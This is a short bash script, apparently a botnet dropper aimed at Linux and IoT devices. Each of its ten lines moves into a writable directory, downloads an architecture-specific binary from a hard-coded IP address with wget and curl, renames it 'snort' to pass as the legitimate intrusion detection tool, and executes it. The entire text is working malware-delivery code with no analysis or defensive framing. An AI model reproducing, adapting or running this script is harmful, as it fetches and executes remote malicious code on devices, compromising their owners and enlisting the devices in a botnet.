#!/bin/bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.163.105/bins/x86; curl -O http://179.43.163.105/bins/x86;cat x86 >snort;chmod +x *;./snort x86
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.163.105/bins/mips; curl -O http://179.43.163.105/bins/mips;cat mips >snort;chmod +x *;./snort mips
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.163.105/bins/mpsl; curl -O http://179.43.163.105/bins/mpsl;cat mpsl >snort;chmod +x *;./snort mpsl
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.163.105/bins/arm4; curl -O http://179.43.163.105/bins/arm4;cat arm4 >snort;chmod +x *;./snort arm4
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.163.105/bins/arm5; curl -O http://179.43.163.105/bins/arm5;cat arm5 >snort;chmod +x *;./snort arm5
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.163.105/bins/arm6; curl -O http://179.43.163.105/bins/arm6;cat arm6 >snort;chmod +x *;./snort arm6
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.163.105/bins/arm7; curl -O http://179.43.163.105/bins/arm7;cat arm7 >snort;chmod +x *;./snort arm7
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.163.105/bins/ppc; curl -O http://179.43.163.105/bins/ppc;cat ppc >snort;chmod +x *;./snort ppc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.163.105/bins/m68k; curl -O http://179.43.163.105/bins/m68k;cat m68k >snort;chmod +x *;./snort m68k
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.163.105/bins/sh4; curl -O http://179.43.163.105/bins/sh4;cat sh4 >snort;chmod +x *;./snort sh4
